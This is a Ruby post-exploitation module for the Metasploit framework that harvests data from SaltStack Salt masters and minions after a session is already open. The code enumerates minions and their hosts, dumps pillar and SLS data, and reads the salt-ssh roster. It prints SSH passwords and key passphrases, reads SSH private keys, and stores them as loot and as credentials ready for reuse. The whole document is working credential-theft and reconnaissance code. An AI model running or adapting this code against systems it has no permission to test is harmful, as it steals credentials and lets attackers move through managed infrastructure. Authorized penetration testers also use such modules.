##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'yaml'

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SaltStack Salt Information Gatherer',
        'Description' => %q{
          This module gathers information from SaltStack Salt masters and minions.
          Data gathered from minions: 1. salt minion config file
          Data gathered from masters: 1. minion list (denied, pre, rejected, accepted)
          2. minion hostname/ip/os (depending on module settings)
          3. SLS
          4. roster, any SSH keys are retrieved and saved to creds, SSH passwords printed
          5. minion config files
          6. pillar data
        },
        'Author' => [
          'h00die',
          'c2Vlcgo'
        ],
        'SessionTypes' => %w[shell meterpreter],
        'License' => MSF_LICENSE
      )
    )
    register_options(
      [
        OptString.new('MINIONS', [true, 'Minions Target', '*']),
        OptBool.new('GETHOSTNAME', [false, 'Gather Hostname from minions', true]),
        OptBool.new('GETIP', [false, 'Gather IP from minions', true]),
        OptBool.new('GETOS', [false, 'Gather OS from minions', true]),
        OptInt.new('TIMEOUT', [true, 'Timeout for salt commands to run', 120])
      ]
    )
  end

  def gather_pillars
    print_status('Gathering pillar data')
    begin
      out = cmd_exec('salt', "'#{datastore['MINIONS']}' --output=yaml pillar.items", datastore['TIMEOUT'])
      vprint_status(out)
      results = YAML.safe_load(out, [Symbol]) # during testing we discovered at times Symbol needs to be loaded
      store_path = store_loot('saltstack_pillar_data_gather', 'application/x-yaml', session, results.to_yaml, 'pillar_gather.yaml', 'SaltStack Salt Pillar Gather')
      print_good("#{peer} - pillar data gathering successfully retrieved and saved to #{store_path}")
    rescue Psych::SyntaxError
      print_error('Unable to process pillar command output')
      return
    end
  end

  def gather_minion_data
    print_status('Gathering data from minions (this can take some time)')
    command = []
    if datastore['GETHOSTNAME']
      command << 'network.get_hostname'
    end
    if datastore['GETIP']
      # command << 'network.ip_addrs'
      command << 'network.interfaces'
    end
    if datastore['GETOS']
      command << 'status.version' # seems to work on linux
      command << 'system.get_system_info' # seems to work on windows, part of salt.modules.win_system
    end
    commas = ',' * (command.length - 1) # we need to provide empty arguments for each command
    command = "salt '#{datastore['MINIONS']}' --output=yaml #{command.join(',')} #{commas}"
    begin
      out = cmd_exec(command, nil, datastore['TIMEOUT'])
      if out == '' || out.nil?
        print_error('No results returned. Try increasing the TIMEOUT or decreasing the minions being checked')
        return
      end
      vprint_status(out)
      results = YAML.safe_load(out, [Symbol]) # during testing we discovered at times Symbol needs to be loaded
      store_path = store_loot('saltstack_minion_data_gather', 'application/x-yaml', session, results.to_yaml, 'minion_data_gather.yaml', 'SaltStack Salt Minion Data Gather')
      print_good("#{peer} - minion data gathering successfully retrieved and saved to #{store_path}")
    rescue Psych::SyntaxError
      print_error('Unable to process gather command output')
      return
    end
    return if results == false || results.nil?
    return if results.include?('Salt request timed out.') || results.include?('Minion did not return.')

    results.each do |_key, result|
      # at times the first line may be "Minions returned with non-zero exit code", so we want to skip that
      next if result.is_a? String

      host_info = {
        name: result['network.get_hostname'],
        os_flavor: result['status.version'],
        comments: "SaltStack Salt minion to #{session.session_host}"
      }
      # mac os
      if result.key?('system.get_system_info') &&
         result['system.get_system_info'].include?('Traceback') &&
         result.key?('status.version') &&
         result['status.version'].include?('unsupported on the current operating system')
        host_info[:os_name] = 'osx' # taken from lib/msf/core/post/osx/system
        host_info[:os_flavor] = ''
      # windows will throw a traceback error for status.version
      elsif result.key?('status.version') &&
            result['status.version'].include?('Traceback')
        info = result['system.get_system_info']
        host_info[:os_name] = info['os_name']
        host_info[:os_flavor] = info['os_version']
        host_info[:purpose] = info['os_type']
      end

      unless datastore['GETIP'] # if we dont get IP, can't make hosts
        print_good("Found minion: #{host_info[:name]} - #{host_info[:os_flavor]}")
        next
      end

      result['network.interfaces'].each do |name, interface|
        next if name == 'lo'
        next if interface['hwaddr'] == ':::::' # Windows Software Loopback Interface
        next unless interface.key? 'inet' # skip if it doesn't have an inet, macos had lots of this
        next if interface['inet'][0]['address'] == '127.0.0.1' # ignore localhost

        host_info[:mac] = interface['hwaddr']
        host_info[:host] = interface['inet'][0]['address'] # ignoring inet6
        report_host(host_info)
        print_good("Found minion: #{host_info[:name]} (#{host_info[:host]}) - #{host_info[:os_flavor]}")
      end
    end
  end

  def list_minions
    # pull minions from a master
    print_status('Attempting to list minions')
    unless command_exists?('salt-key')
      print_error('salt-key not present on system')
      return
    end
    begin
      out = cmd_exec('salt-key', '-L --output=yaml', datastore['TIMEOUT'])
      vprint_status(out)
      minions = YAML.safe_load(out)
    rescue Psych::SyntaxError
      print_error('Unable to load salt-key -L data')
      return
    end

    tbl = Rex::Text::Table.new(
      'Header' => 'Minions List',
      'Indent' => 1,
      'Columns' => ['Status', 'Minion Name']
    )

    store_path = store_loot('saltstack_minions', 'application/x-yaml', session, minions.to_yaml, 'minions.yaml', 'SaltStack Salt salt-key list')
    print_good("#{peer} - minion file successfully retrieved and saved to #{store_path}")
    minions['minions'].each do |minion|
      tbl << ['Accepted', minion]
    end
    minions['minions_pre'].each do |minion|
      tbl << ['Unaccepted', minion]
    end
    minions['minions_rejected'].each do |minion|
      tbl << ['Rejected', minion]
    end
    minions['minions_denied'].each do |minion|
      tbl << ['Denied', minion]
    end
    print_good(tbl.to_s)
  end

  def minion
    print_status('Looking for salt minion config files')
    # https://github.com/saltstack/salt/blob/b427688048fdbee106f910c22ebeb105eb30aa10/doc/ref/configuration/minion.rst#configuring-the-salt-minion
    [
      '/etc/salt/minion', # linux, osx
      'C://salt//conf//minion',
      '/usr/local/etc/salt/minion' # freebsd
    ].each do |config|
      next unless file?(config)

      minion = YAML.safe_load(read_file(config))
      if minion['master']
        print_good("Minion master: #{minion['master']}")
      end
      store_path = store_loot('saltstack_minion', 'application/x-yaml', session, minion.to_yaml, 'minion.yaml', 'SaltStack Salt Minion File')
      print_good("#{peer} - minion file successfully retrieved and saved to #{store_path}")
      break # no need to process more
    end
  end

  def master
    list_minions
    gather_minion_data if datastore['GETOS'] || datastore['GETHOSTNAME'] || datastore['GETIP']

    # get sls files
    unless command_exists?('salt')
      print_error('salt not found on system')
      return
    end
    print_status('Showing SLS')
    output = cmd_exec('salt', "'#{datastore['MINIONS']}' state.show_sls '*'", datastore['TIMEOUT'])
    store_path = store_loot('saltstack_sls', 'text/plain', session, output, 'sls.txt', 'SaltStack Salt Master SLS Output')
    print_good("#{peer} - SLS output successfully retrieved and saved to #{store_path}")

    # get roster
    # https://github.com/saltstack/salt/blob/023528b3b1b108982989c4872c138d1796821752/doc/topics/ssh/roster.rst#salt-rosters
    print_status('Loading roster')
    priv_values = {}
    ['/etc/salt/roster'].each do |config|
      next unless file?(config)

      begin
        minions = YAML.safe_load(read_file(config))
      rescue Psych::SyntaxError
        print_error("Unable to load #{config}")
        next
      end
      store_path = store_loot('saltstack_roster', 'application/x-yaml', session, minion.to_yaml, 'roster.yaml', 'SaltStack Salt Roster File')
      print_good("#{peer} - roster file successfully retrieved and saved to #{store_path}")
      next if minions.nil?

      minions.each do |name, minion|
        host = minion['host'] # aka ip
        user = minion['user']
        port = minion['port'] || 22
        passwd = minion['passwd']
        # sudo = minion['sudo'] || false
        priv = minion['priv'] || false
        priv_pass = minion['priv_passwd'] || false

        print_good("Found SSH minion: #{name} (#{host})")
        # make a special print for encrypted ssh keys
        unless priv_pass == false
          print_good("  SSH key #{priv} password #{priv_pass}")
          report_note(host: host,
                      proto: 'TCP',
                      port: port,
                      type: 'SSH Key Password',
                      data: "#{priv} => #{priv_pass}")
        end

        host_info = {
          name: name,
          comments: "SaltStack Salt ssh minion to #{session.session_host}",
          host: host
        }
        report_host(host_info)

        cred = {
          address: host,
          port: port,
          protocol: 'tcp',
          workspace_id: myworkspace_id,
          origin_type: :service,
          private_type: :password,
          service_name: 'SSH',
          module_fullname: fullname,
          username: user,
          status: Metasploit::Model::Login::Status::UNTRIED
        }
        if passwd
          cred[:private_data] = passwd
          create_credential_and_login(cred)
          next
        end

        # handle ssh keys if it wasn't a password
        cred[:private_type] = :ssh_key
        if priv_values[priv]
          cred[:private_data] = priv_values[priv]
          create_credential_and_login(cred)
          next
        end

        unless file?(priv)
          print_error("  Unable to find salt-ssh priv key #{priv}")
          next
        end
        input = read_file(priv)
        store_path = store_loot('ssh_key', 'plain/txt', session, input, 'salt-ssh.rsa', 'SaltStack Salt SSH Private Key')
        print_good("  #{priv} stored to #{store_path}")
        priv_values[priv] = input
        cred[:private_data] = input
        create_credential_and_login(cred)
      end
    end
    gather_pillars
  end

  def run
    if session.platform == 'windows'
      # the docs dont show that you can run as a master, nor was the master .bat included as of this writing
      minion
    end
    minion if command_exists?('salt-minion')
    master if command_exists?('salt-master')
  end

end
